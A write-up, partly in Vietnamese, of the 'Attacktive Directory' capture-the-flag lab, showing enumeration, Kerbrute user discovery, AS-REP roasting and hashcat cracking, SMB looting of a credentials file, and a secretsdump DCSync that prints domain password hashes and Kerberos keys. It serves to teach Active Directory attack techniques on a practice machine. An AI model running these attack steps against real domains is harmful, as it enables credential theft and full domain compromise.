# Attacktive Directory

<figure><img src="../.gitbook/assets/image (948).png" alt=""><figcaption></figcaption></figure>

Enumeration Welcome to Attacktive Directory\



đầu tiên ta sẽ tiến hành nmap

```bash
┌──(root㉿kali)-[~]
└─# sudo nmap -T4 -p- 10.49.167.155
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-20 14:08 UTC
Nmap scan report for ip-10-49-167-155.ap-south-1.compute.internal (10.49.167.155)
Host is up (0.0040s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49686/tcp open  unknown
49695/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds

```



```bash
                                                                                                                                                                            (base) ┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665 10.49.167.155
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-20 11:07 -0400
Nmap scan report for 10.49.167.155
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-20 15:08:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-06-19T14:05:20
|_Not valid after:  2026-12-19T14:05:20
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-20T15:08:52+00:00
|_ssl-date: 2026-06-20T15:09:00+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-06-20T15:08:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.99 seconds

```



Ta hoàn toàn có thể sử dụng smbclient và enum4linux để enum port 139/445

Enum4linux là công cụ trên Linux dùng để thu thập thông tin từ máy Windows thông qua giao thức SMB và NetBIOS.

Nó thường được dùng trong giai đoạn reconnaissance để tìm:

* Tên máy
* Tên domain
* Danh sách user
* Danh sách group
* Shared folders
* Password policy
* Phiên bản hệ điều hành
* Thông tin Domain Controller

Lệnh thường dùng:

```
enum4linux -a <IP>
```

<figure><img src="../.gitbook/assets/image (949).png" alt=""><figcaption></figcaption></figure>



```bash
(base) ┌──(kali㉿kali)-[~]
└─$ enum4linux 10.49.167.155                               
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 20 11:15:08 2026

 =========================================( Target Information )=========================================
                                                                                                                                                                            
Target ........... 10.49.167.155                                                                                                                                            
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.49.167.155 )===========================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Can't find workgroup/domain                                                                                                                                             
                                                                                                                                                                            
                                                                                                                                                                            

 ===============================( Nbtstat Information for 10.49.167.155 )===============================
                                                                                                                                                                            
Looking up status of 10.49.167.155                                                                                                                                          
No reply from 10.49.167.155

 ===================================( Session Check on 10.49.167.155 )===================================
                                                                                                                                                                            
                                                                                                                                                                            
[+] Server 10.49.167.155 allows sessions using username '', password ''                                                                                                     
                                                                                                                                                                            
                                                                                                                                                                            
 ================================( Getting domain SID for 10.49.167.155 )================================
                                                                                                                                                                            
Domain Name: THM-AD                                                                                                                                                         
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                                                                                              
                                                                                                                                                                            
                                                                                                                                                                            
 ==================================( OS information on 10.49.167.155 )==================================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            
[+] Got OS info for 10.49.167.155 from srvinfo:                                                                                                                             
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                      


 =======================================( Users on 10.49.167.155 )=======================================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                         
                                                                                                                                                                            
                                                                                                                                                                            
 =================================( Share Enumeration on 10.49.167.155 )=================================
                                                                                                                                                                            
do_connect: Connection to 10.49.167.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                    

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.49.167.155                                                                                                                               
                                                                                                                                                                            
                                                                                                                                                                            
 ===========================( Password Policy Information for 10.49.167.155 )===========================
                                                                                                                                                                            
Password:                                                                                                                                                                   

[E] Unexpected error from polenum:                                                                                                                                          
                                                                                                                                                                            
                                                                                                                                                                            

[+] Attaching to 10.49.167.155 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.49.167.155)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.



[E] Failed to get password policy with rpcclient                                                                                                                            
                                                                                                                                                                            
                                                                                                                                                                            

 ======================================( Groups on 10.49.167.155 )======================================
                                                                                                                                                                            
                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                 
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                     
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                  
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                       
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                 
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                      
                                                                                                                                                                            
                                                                                                                                                                            
 ==================( Users on 10.49.167.155 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                            
                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                
                                                                                                                                                                            
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                    
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                 
                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                              
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ===============================( Getting printer info for 10.49.167.155 )===============================
                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                     


enum4linux complete on Sat Jun 20 11:31:40 2026
                                                                                                                                                                                                                                                     
```



<figure><img src="../.gitbook/assets/image (951).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (950).png" alt=""><figcaption></figcaption></figure>



Enumeration Enumerating Users via Kerberos


Kerberos là dịch vụ xác thực cốt lõi trong Active Directory. Khi cổng Kerberos mở, có thể sử dụng Kerbrute để liệt kê user, dò mật khẩu hoặc thực hiện password spraying.

Lưu ý:

* Một số phiên bản Kerbrute mới không còn hỗ trợ tùy chọn UserEnum.
* Nếu gặp lỗi, hãy dùng phiên bản cũ hơn.

Enumeration:

* Sử dụng danh sách user và password được cung cấp để giảm thời gian kiểm thử.
* Không nên brute force mật khẩu vì có thể kích hoạt chính sách khóa tài khoản trên Domain Controller.



<figure><img src="../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>

```bash
(base) ┌──(kali㉿kali)-[~/adt]
└─$ kerbrute -h

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/20/26 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```





```bash
(base) ┌──(kali㉿kali)-[~/adt]
└─$ kerbrute userenum --dc 10.49.167.155 -d spookysec.local u.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/20/26 - Ronnie Flathers @ropnop

2026/06/20 12:27:43 >  Using KDC(s):
2026/06/20 12:27:43 >   10.49.167.155:88

2026/06/20 12:27:43 >  [+] VALID USERNAME:       james@spookysec.local
2026/06/20 12:27:45 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/06/20 12:27:48 >  [+] VALID USERNAME:       James@spookysec.local
2026/06/20 12:27:48 >  [+] VALID USERNAME:       robin@spookysec.local
2026/06/20 12:27:58 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/06/20 12:28:09 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/06/20 12:28:21 >  [+] VALID USERNAME:       backup@spookysec.local
2026/06/20 12:28:26 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/06/20 12:29:01 >  [+] VALID USERNAME:       JAMES@spookysec.local
2026/06/20 12:29:13 >  [+] VALID USERNAME:       Robin@spookysec.local
2026/06/20 12:30:22 >  [+] VALID USERNAME:       Administrator@spookysec.local
2026/06/20 12:32:44 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2026/06/20 12:33:30 >  [+] VALID USERNAME:       Paradox@spookysec.local
```



<figure><img src="../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>



Exploitation Abusing Kerberos\



Sau khi hoàn thành enumerate các tài khoản người dùng, ta có thể khai thác một tính năng của Kerberos bằng kỹ thuật **ASREPRoasting**.

**ASREPRoasting** xảy ra khi tài khoản có tùy chọn **"Does not require Pre-Authentication"** được bật. Điều này cho phép tài khoản yêu cầu Kerberos Ticket mà không cần xác thực trước.

### Retrieving Kerberos Tickets

{% embed url="https://github.com/SecureAuthCorp/impacket" %}

**Impacket** cung cấp công cụ **GetNPUsers.py** để truy vấn các tài khoản dễ bị **ASREPRoasting** từ **KDC**.

Để dùng dc tool này thì ta phải dùng `kerbrute` để liệt kê ra các tài khoản hợp lệ trước



```bash
┌──(root㉿kali)-[/home/kali/adt]
└─# python3 /home/kali/tools/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.49.188.27 -no-pass -usersfile u.txt
```

<figure><img src="../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

```bash
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0266210064a0be5c6babf4d7d98704ce$273ab8eea13ef853aac599cbea291e96ea52141362071ef1646ea6ab13fdc3c237231e41384a2afe1ae0c447fc8fd5a2c9b33dc5945b5cf8d35865125ba76c8eb52f2068f8f4354f0a896264d56570203360dc295f68e963e1a02c78a59043755ec3b59f6d16998bbd6aa28169b80401da625c2a9788bb1e0281127d931defcafe51926cd76d776857c669faacc06ca21c3d9b7e5e89e7c05f84c276214e39918acaf53e0b3d0eeb4280888daf009a6be7b58b7e420a6bf8ebf302e7e7b110cf4c0a8f28f2358a769809a614c8e981dff7a4b2a8be023488c6b4ef9d40f2a9391e5a0e0349875292edd3b0a2046c1b819baa
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

<figure><img src="../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>

[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

<figure><img src="../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../.gitbook/assets/image (957).png" alt=""><figcaption></figcaption></figure>

```bash
(base) ┌──(kali㉿kali)-[~/adt]
└─$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12450HX, 2336/4673 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (4023 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0266210064a0be5c6babf4d7d98704ce$273ab8eea13ef853aac59
9cbea291e96ea52141362071ef1646ea6ab13fdc3c237231e41384a2afe1ae0c447fc8fd5a2c9b33dc5945b5cf8d35
865125ba76c8eb52f2068f8f4354f0a896264d56570203360dc295f68e963e1a02c78a59043755ec3b59f6d16998b
bd6aa28169b80401da625c2a9788bb1e0281127d931defcafe51926cd76d776857c669faacc06ca21c3d9b7e5e89e
7c05f84c276214e39918acaf53e0b3d0eeb4280888daf009a6be7b58b7e420a6bf8ebf302e7e7b110cf4c0a8f28f23
58a769809a614c8e981dff7a4b2a8be023488c6b4ef9d40f2a9391e5a0e0349875292edd3b0a2046c1b8
19baa:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0266210064a...819baa
Time.Started.....: Sun Jun 21 07:07:20 2026, (13 secs)
Time.Estimated...: Sun Jun 21 07:07:33 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   488.2 kH/s (2.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5841920/14344385 (40.73%)
Rejected.........: 0/5841920 (0.00%)
Restore.Point....: 5834752/14344385 (40.68%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: mancin1 -> mamigrl1
Hardware.Mon.#01.: Util: 31%

Started: Sun Jun 21 07:06:38 2026
Stopped: Sun Jun 21 07:07:35 2026

```



## Enumeration Back to the Basics

### Enumeration:

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

với thông tin về mật khẩu của user admin kia thì ta sẽ tiến hành bước tiếp theo với smbclient



```bash
┌──(root㉿kali)-[/home/kali/adt]
└─# smbclient -L spookysec.local -U svc-admin

Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                  
```

<figure><img src="../.gitbook/assets/image (958).png" alt=""><figcaption></figcaption></figure>



```bash
┌──(root㉿kali)-[/home/kali/adt]
└─# smbclient //spookysec.local/backup -U svc-admin

Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3822442 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```



<figure><img src="../.gitbook/assets/image (959).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(root㉿kali)-[/home/kali/adt]
└─# cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw     
```





<figure><img src="../.gitbook/assets/image (961).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (960).png" alt=""><figcaption></figcaption></figure>

```bash
backup@spookysec.local:backup2517860
```

từ đó ta tiến hành rdp vào&#x20;

```bash
xfreerdp /u:backup /p:backup2517860 /v:10.49.188.27
```

\[Domain Privilege Escalation] Elevating Privileges within the Domain\



Bây giờ khi đã có credentials của một tài khoản người dùng mới, chúng ta có thể có nhiều privileges trên hệ thống hơn trước.

Tên người dùng của tài khoản "backup" khiến chúng ta suy nghĩ. Tài khoản này dùng để backup cho cái gì?

Thực tế, đây là tài khoản backup của Domain Controller.

<figure><img src="../.gitbook/assets/image (963).png" alt=""><figcaption></figcaption></figure>

Tài khoản này có một permission đặc biệt cho phép mọi thay đổi trong Active Directory được đồng bộ với tài khoản người dùng này. Điều này bao gồm cả password hashes.

Biết được điều này, chúng ta có thể sử dụng một công cụ khác trong Impacket có tên là `secretsdump.py`.

Công cụ này cho phép chúng ta trích xuất toàn bộ password hashes mà tài khoản người dùng này (được đồng bộ với Domain Controller) có quyền truy cập.

Khai thác khả năng này, chúng ta sẽ có được quyền kiểm soát gần như hoàn toàn đối với AD Domain.

<figure><img src="../.gitbook/assets/image (964).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (965).png" alt=""><figcaption></figcaption></figure>

```bash
(base) ┌──(kali㉿kali)-[~/adt]
└─$ python3 /home/kali/tools/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.49.188.27            
Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:dd13c93e236a67a69893f19b263451ae:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
